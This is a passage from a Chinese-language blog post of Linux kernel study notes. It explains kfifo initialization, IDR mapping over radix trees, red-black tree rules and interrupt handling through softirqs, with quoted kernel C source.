class="line">EXPORT_SYMBOL(__kfifo_alloc);</span><br></pre></td></tr></table></figure>
<p>创建队列 <code>kfifo_init</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kfifo_init(fifo, buffer, size) \</span></span><br><span class="line"><span class="meta">(&#123; \</span></span><br><span class="line"><span class="meta">	typeof((fifo) + 1) __tmp = (fifo); \</span></span><br><span class="line"><span class="meta">	struct __kfifo *__kfifo = &amp;__tmp-&gt;kfifo; \</span></span><br><span class="line"><span class="meta">	__is_kfifo_ptr(__tmp) ? \</span></span><br><span class="line"><span class="meta">	__kfifo_init(__kfifo, buffer, size, sizeof(*__tmp-&gt;type)) : \</span></span><br><span class="line"><span class="meta">	-EINVAL; \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>该函数创建并初始化一个 kfifo 对象，它将使用由指针 buffer 指向的 size 字节大小的内存</li>
<li>该函数的核心还是调用 <code>__kfifo_init</code>，并为该 buffer 初始化 <code>__kfifo</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __kfifo_init(struct __kfifo *fifo, <span class="keyword">void</span> *buffer,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">size_t</span> esize)</span><br><span class="line">&#123;</span><br><span class="line">	size /= esize;</span><br><span class="line">	size = roundup_pow_of_two(size);</span><br><span class="line"></span><br><span class="line">	fifo-&gt;in = <span class="number">0</span>;</span><br><span class="line">	fifo-&gt;out = <span class="number">0</span>;</span><br><span class="line">	fifo-&gt;esize = esize;</span><br><span class="line">	fifo-&gt;data = buffer;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &lt; <span class="number">2</span>) &#123;</span><br><span class="line">		fifo-&gt;mask = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line">	fifo-&gt;mask = size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Linux 中对队列的其他操作如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	kfifo_in(fifo, buf, n) <span class="comment">/* 向队列fifo中推入n字节的buf */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	kfifo_out(fifo, buf, n) <span class="comment">/* 向队列fifo中摘取n字节的buf */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kfifo_size(fifo) <span class="comment">/* 获取队列长度(使用__kfifo-&gt;mask) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kfifo_reset(fifo) <span class="comment">/* 重置fifo(放弃该fifo中的所有数据) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kfifo_free(fifo) <span class="comment">/* 释放一个使用kfifo_alloc分配的队列(对于使用kfifo_init生成的队列,需要手动释放自己提供的buffer) */</span></span></span><br></pre></td></tr></table></figure>
<p><strong>映射</strong></p>
<p>映射（也称为关联数组）是实现（key，value）绑定的一种数据结构（有点像其他语言中的字典类型），每个唯一的ID对应一个自定义的数据结构</p>
<p>映射需要至少支持三个操作：</p>
<ul>
<li>Add（key，value）</li>
<li>Remove（key）</li>
<li>value = Lookup（key）</li>
</ul>
<p>在 Linux 中的映射的目的是绑定一个标识数（UID）到一个指针，使用计算就是整数ID管理机制（IDR）</p>
<ul>
<li>IDR 是用于将 uid 和一个数据地址进行绑定的一种映射</li>
<li>IDR 把每一个ID分级数据进行管理，每一级维护着ID的5位数据，这样就可以把IDR分为7级进行管理</li>
<li>IDR 底层使用了 redix 树 </li>
</ul>
<p>IDR 怎么对于数据ID管理呢？传统上我们对于未使用的ID进行管理的时候可以使用位图进行管理，也可以使用数组进行管理，也可以使用链表进行ID管理，三个个各有优缺点：</p>
<ul>
<li>使用位图进行管理：使用空间少，但是对于位图对应的数据结构支持不太友好</li>
<li>使用数组进行管理：寻址快速，但是只能管理比较少量的ID数目</li>
<li>使用链表进行管理：可以支持大量的数据ID，但是通过链表的指针寻址比较慢</li>
</ul>
<p>而 IDR 管理可以集合以上3者的优点：</p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660836387459-1666871176497.png" class width="1660836387459"> 
<p><strong>Linux 中映射的实现</strong></p>
<p>以下结构体用于映射用户空间的 UID：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idr</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">radix_tree_root</span>	<span class="title">idr_rt</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		idr_base;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		idr_next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct radix_tree_root *</span></span><br><span class="line"><span class="function"><span class="title">xfs_dquot_tree</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	struct xfs_quotainfo	*qi,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span>			type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (type) &#123;</span><br><span class="line">	<span class="keyword">case</span> XFS_DQ_USER:</span><br><span class="line">		<span class="keyword">return</span> &amp;qi-&gt;qi_uquota_tree;</span><br><span class="line">	<span class="keyword">case</span> XFS_DQ_GROUP:</span><br><span class="line">		<span class="keyword">return</span> &amp;qi-&gt;qi_gquota_tree;</span><br><span class="line">	<span class="keyword">case</span> XFS_DQ_PROJ:</span><br><span class="line">		<span class="keyword">return</span> &amp;qi-&gt;qi_pquota_tree;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		ASSERT(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>struct idr</code> 类于 <code>list_head</code>，用于管理 IDR 整个树的信息</li>
<li>其中最关键的是 <code>radix_tree_root</code>，它是 Linux 内核 Radix Tree 的基础数据结构</li>
<li>Linux 整数ID管理机制（IDR）的底层算法就是 Radix Tree，每个 <code>idr</code> 都是被 Radix Tree 组织起来的一个个单元，通过 Radix Tree 可以快速查找到各个 <code>idr</code></li>
</ul>
<p>初始化一个 <code>idr</code>：（需要提前定义静态的 <code>idr</code> 结构）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">idr_init</span><span class="params">(struct idr *idr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	idr_init_base(idr, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">idr_init_base</span><span class="params">(struct idr *idr, <span class="keyword">int</span> base)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	INIT_RADIX_TREE(&amp;idr-&gt;idr_rt, IDR_RT_MARKER);</span><br><span class="line">	idr-&gt;idr_base = base;</span><br><span class="line">	idr-&gt;idr_next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分配一个 <code>idr</code>：（把一个 UID 分配给目标 <code>idr</code>，需要两个步骤）</p>
<ul>
<li>调整后备树的大小：（为下一次调用 <code>idr_alloc()</code> 预分配内存）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idr_preload</span><span class="params">(<span class="keyword">gfp_t</span> gfp_mask)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (__radix_tree_preload(gfp_mask, IDR_PRELOAD_SIZE))</span><br><span class="line">		preempt_disable();</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(idr_preload);</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>@start</code> 和 <code>@end</code> 指定的范围内分配一个未使用的ID：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">idr_alloc</span><span class="params">(struct idr *idr, <span class="keyword">void</span> *ptr, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">gfp_t</span> gfp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * @idr: IDR句柄</span></span><br><span class="line"><span class="comment">     * @ptr: 与新ID关联的指针</span></span><br><span class="line"><span class="comment">     * @start: 最小ID</span></span><br><span class="line"><span class="comment">     * @end: 最大ID</span></span><br><span class="line"><span class="comment">     * @gfp: 内存分配标志</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">	u32 id = start;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (WARN_ON_ONCE(start &lt; <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	ret = idr_alloc_u32(idr, ptr, &amp;id, end &gt; <span class="number">0</span> ? end - <span class="number">1</span> : INT_MAX, gfp);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(idr_alloc);</span><br></pre></td></tr></table></figure>
<p>查找一个 <code>idr</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">idr_find</span><span class="params">(<span class="keyword">const</span> struct idr *idr, <span class="keyword">unsigned</span> <span class="keyword">long</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> radix_tree_lookup(&amp;idr-&gt;idr_rt, id - idr-&gt;idr_base);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(idr_find);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">radix_tree_lookup</span><span class="params">(<span class="keyword">const</span> struct radix_tree_root *root, <span class="keyword">unsigned</span> <span class="keyword">long</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __radix_tree_lookup(root, index, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(radix_tree_lookup);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__radix_tree_lookup(<span class="keyword">const</span> struct radix_tree_root *root,</span><br><span class="line">			  <span class="keyword">unsigned</span> <span class="keyword">long</span> index, struct radix_tree_node **nodep,</span><br><span class="line">			  <span class="keyword">void</span> __rcu ***slotp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *	@root:	基数树根</span></span><br><span class="line"><span class="comment">     *	@index:	索引键</span></span><br><span class="line"><span class="comment">     *	@nodep:	返回节点</span></span><br><span class="line"><span class="comment">     *	@slotp:	返回插槽</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">radix_tree_node</span> *<span class="title">node</span>, *<span class="title">parent</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> maxindex;</span><br><span class="line">	<span class="keyword">void</span> __rcu **slot;</span><br><span class="line"></span><br><span class="line"> restart:</span><br><span class="line">	parent = <span class="literal">NULL</span>;</span><br><span class="line">	slot = (<span class="keyword">void</span> __rcu **)&amp;root-&gt;xa_head;</span><br><span class="line">	radix_tree_load_root(root, &amp;node, &amp;maxindex);</span><br><span class="line">	<span class="keyword">if</span> (index &gt; maxindex)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (radix_tree_is_internal_node(node)) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> offset;</span><br><span class="line"></span><br><span class="line">		parent = entry_to_node(node);</span><br><span class="line">		offset = radix_tree_descend(parent, &amp;node, index);</span><br><span class="line">		slot = parent-&gt;slots + offset;</span><br><span class="line">		<span class="keyword">if</span> (node == RADIX_TREE_RETRY)</span><br><span class="line">			<span class="keyword">goto</span> restart;</span><br><span class="line">		<span class="keyword">if</span> (parent-&gt;shift == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nodep)</span><br><span class="line">		*nodep = parent;</span><br><span class="line">	<span class="keyword">if</span> (slotp)</span><br><span class="line">		*slotp = slot;</span><br><span class="line">	<span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果该函数调用成功，则返回 ID 关联的指针</li>
<li>如果报错，则返回 NULL</li>
</ul>
<p>删除一个 <code>idr</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">idr_remove</span><span class="params">(struct idr *idr, <span class="keyword">unsigned</span> <span class="keyword">long</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> radix_tree_delete_item(&amp;idr-&gt;idr_rt, id - idr-&gt;idr_base, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">radix_tree_delete_item</span><span class="params">(struct radix_tree_root *root,</span></span></span><br><span class="line"><span class="params"><span class="function">			     <span class="keyword">unsigned</span> <span class="keyword">long</span> index, <span class="keyword">void</span> *item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">radix_tree_node</span> *<span class="title">node</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">void</span> __rcu **slot = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">void</span> *entry;</span><br><span class="line"></span><br><span class="line">	entry = __radix_tree_lookup(root, index, &amp;node, &amp;slot);</span><br><span class="line">	<span class="keyword">if</span> (!slot)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (!entry &amp;&amp; (!is_idr(root) || node_tag_get(root, node, IDR_FREE,</span><br><span class="line">						get_slot_offset(node, slot))))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (item &amp;&amp; entry != item)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	__radix_tree_delete(root, node, slot);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(radix_tree_delete_item);</span><br></pre></td></tr></table></figure>
<ul>
<li>如果 <code>idr_remove</code> 调用成功，则将 ID 关联的指针一起从映射中删除</li>
<li>返回被删除的条目，如果不存在则返回 NULL</li>
</ul>
<p>撤销一个 <code>idr</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idr_destroy</span><span class="params">(struct idr *idr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">radix_tree_node</span> *<span class="title">node</span> =</span> rcu_dereference_raw(idr-&gt;idr_rt.xa_head);</span><br><span class="line">	<span class="keyword">if</span> (radix_tree_is_internal_node(node))</span><br><span class="line">		radix_tree_free_nodes(node);</span><br><span class="line">	idr-&gt;idr_rt.xa_head = <span class="literal">NULL</span>;</span><br><span class="line">	root_tag_set(&amp;idr-&gt;idr_rt, IDR_FREE);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(idr_destroy);</span><br></pre></td></tr></table></figure>
<ul>
<li>如果 <code>idr_destroy</code> 调用成功，则只释放 <code>idr</code> 中未使用的内存，并不会释放当前已经分配给 UID 使用的内存</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1432802">linux内核IDR机制详解</a> </p>
<p><strong>红黑树</strong></p>
<p>红黑树是对概念模型2-3-4树的一种实现，由于直接进行不同节点间的转化会造成较大的开销，所以选择以二叉树为基础，在二叉树的属性中加入一个 <strong>颜色属性</strong> 来表示2-3-4树中不同的节点</p>
<p>红黑规则：</p>
<ul>
<li>节点不是黑色，就是红色（非黑即红）</li>
<li>根节点为黑色，叶节点为黑色（叶节点是指末梢的空节点 <code>Nil</code>或<code>Null</code>）</li>
<li>一个节点为红色，则其两个子节点必须是黑色的（根到叶子的所有路径，不可能存在两个连续的红色节点）</li>
<li>每个节点到叶子节点的所有路径，都包含相同数目的黑色节点（相同的黑色高度）</li>
</ul>
<p>在插链的过程中，可能会破坏这些规则，这就需要一些机制来恢复平衡：</p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1655523602992-1666871176497.png" class width="1655523602992"> 
<h2 id="中断处理"><a href="#中断处理" class="headerlink" title="中断处理"></a>中断处理</h2><p>为了提高CPU和外围硬件（硬盘，键盘，鼠标等等）之间协同工作的性能，引入了中断的机制，中断是一种电信号，由硬件设备产生，并直接送入中断控制器的输入引脚中，中断机制是硬件在需要的时候向CPU发出信号，CPU暂时停止正在进行的工作来处理硬件请求</p>
<ul>
<li>异步中断（一般由硬件引起）：CPU 处理中断的时间过长，所以先将硬件复位，使硬件可以继续自己的工作，然后在适当时候处理中断请求中耗时的部分</li>
<li>同步中断：CPU 处理完中断请求的所有工作后才反馈硬件</li>
</ul>
<p><strong>硬中断</strong></p>
<p>由与系统相连的外设（比如网卡、硬盘）自动产生的，主要是用来通知操作系统系统外设状态的变化（比如当网卡收到数据包的时候，就会发出一个硬中断）</p>
<p>为了在中断执行时间尽可能短和中断处理需完成大量工作之间找到一个平衡点，Linux 将中断处理程序分解为两个半部：上半部（top half）和下半部（bottom half）：</p>
<ul>
<li>顶半部完成尽可能少的比较紧急的功能，它往往只是 <strong>简单地读取寄存器中的中断状态并清除中断标志后就进行“登记中断”的工作</strong><ul>
<li>“登记中断”：将底半部处理程序挂到该设备的执行队列中去</li>
</ul>
</li>
<li><strong>底半部负责执行中断处理程序</strong>，它来完成中断事件的绝大多数任务，而且可以被新的中断打断</li>
<li>顶半部往往被设计成不可中断，底半部则相对来说并不是非常紧急的，而且相对比较耗时，不在硬件中断服务程序中执行，所以可以打断</li>
</ul>
<p>简单来说就是：</p>
<ul>
<li>上半部：登记中断，把底半部处理程序挂到该设备的执行队列中，不可中断必须立刻完成</li>
<li>下半部：负责中断处理程序的具体实现，可中断（可以稍后完成）</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660878766425-1666871176497.png" class width="1660878766425"> 
<p>上半部由硬中断完成，实现下半部的方法很多，目前使用最多的是以下3中方法：</p>
<ul>
<li>softirq 软中断</li>
<li>tasklet 小片任务</li>
<li>工作队列</li>
</ul>
<p><strong>硬中断和软中断的区别</strong> </p>
<ul>
<li>软中断是执行中断指令产生的，而硬中断是由外设引发的</li>
<li>硬中断的中断号是由中断控制器提供的，软中断的中断号由指令直接指出，无需使用中断控制器</li>
<li>硬中断是可屏蔽的，软中断不可屏蔽</li>
<li>硬中断处理程序要确保它能快速地完成任务，这样程序执行时才不会等待较长时间，称为 <strong>[上半部]</strong></li>
<li>软中断处理硬中断未完成的工作，是一种推后执行的机制，属于 <strong>[下半部]</strong></li>
</ul>
<p><strong>softirq 软中断</strong></p>
<p>软中断的流程如下： </p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660879056533-1666871176497.png" class width="1660879056533"> 
<p>软中断是在编译期间静态分配的，它不像 tasklet 那样能被动态地注册或注销，软中断由 <code>softirq_action</code> 结构体表示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">softirq_action</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">void</span>	(*action)(struct softirq_action *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个结构体的字段是个函数指针，字段名称是 action</li>
<li>函数指针的参数是 <code>struct softirq_action</code> 的地址，其实就是指向 <code>softirq_vec</code> 中的某一项：<ul>
<li>如果 <code>open_softirq</code> 是这样调用的：<code>open_softirq(NET_TX_SOFTIRQ, my_tx_action)</code></li>
<li>那么 <code>my_tx_action</code> 的参数就是：<code>softirq_vec[NET_TX_SOFTIRQ]</code> 的地址</li>
</ul>
</li>
</ul>
<p>注册软中断的函数 open_softirq：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_softirq</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">void</span> (*action)(struct softirq_action *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// nr: 软中断类型</span></span><br><span class="line">    <span class="comment">// (*action)(struct softirq_action *: 软中断处理程序的函数指针</span></span><br><span class="line">    softirq_vec[nr].action = action; <span class="comment">/* softirq_vec是个softirq_action类型的数组 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>将软中断类型和软中断处理函数加入到软中断序列中</li>
</ul>
<p>触发软中断的函数 raise_softirq：（属于上半部）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">raise_softirq</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span> <span class="comment">/* 被触发的中断类型 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    local_irq_save(flags); <span class="comment">/* 保存寄存器 */</span></span><br><span class="line">    raise_softirq_irqoff(nr); <span class="comment">/* 触发软中断 */</span></span><br><span class="line">    local_irq_restore(flags); <span class="comment">/* 恢复寄存器 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">raise_softirq_irqoff</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__raise_softirq_irqoff(nr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!in_interrupt())</span><br><span class="line">		wakeup_softirqd(); <span class="comment">/* 唤醒ksoftirqd(内核线程),用于辅助处理软中断 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>关于 <code>ksoftirqd</code> 机制，后文会介绍</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> or_softirq_pending(x)  (S390_lowcore.softirq_pending |= (x))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __raise_softirq_irqoff(<span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span><br><span class="line">&#123;</span><br><span class="line">	trace_softirq_raise(nr);</span><br><span class="line">	or_softirq_pending(<span class="number">1UL</span> &lt;&lt; nr); <span class="comment">/* 操作触发&#x27;软中断类型&#x27;的bit位为1 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
